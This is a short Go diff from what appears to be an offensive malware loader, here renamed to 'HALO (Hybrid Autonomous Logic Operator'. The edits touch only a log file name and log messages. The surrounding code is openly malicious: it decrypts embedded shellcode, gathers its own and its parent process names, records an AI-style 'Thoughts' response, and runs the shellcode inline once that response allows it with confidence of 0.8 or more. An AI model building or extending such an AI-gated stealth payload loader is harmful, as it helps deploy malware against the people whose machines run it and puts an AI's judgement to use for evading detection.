@@ -16,11 +16,11 @@ func main() {
 		os.Exit(1)
 	}
 
-	logging.InitLog("opsec.log")
+	logging.InitLog("HALO.log")
 	defer logging.CloseLog()
 
 	selfProc, parentProc := telemetry.GetSelfAndParentNames()
-	logging.LogLine("[*] AI-powered stealth payload started. Self: " + selfProc + ", Parent: " + parentProc)
+	logging.LogLine("[*] HALO (Hybrid Autonomous Logic Operator started. Self: " + selfProc + ", Parent: " + parentProc)
 
 	shellcodeBytes, err := shellcode.Decrypt()
 	if err != nil || len(shellcodeBytes) == 0 {
@@ -46,7 +46,7 @@ func main() {
 		logging.LogLine("[*] Thoughts: " + resp.Thoughts)
 
 		if resp.Allow && resp.Conf >= 0.8 {
-			logging.LogLine("[+] Execution approved. Launching payload inline.")
+			logging.LogLine("[+] Execution approved. executing shellcode inline.")
 
 			err := shellcode.Execute(shellcodeBytes)
 			if err != nil {
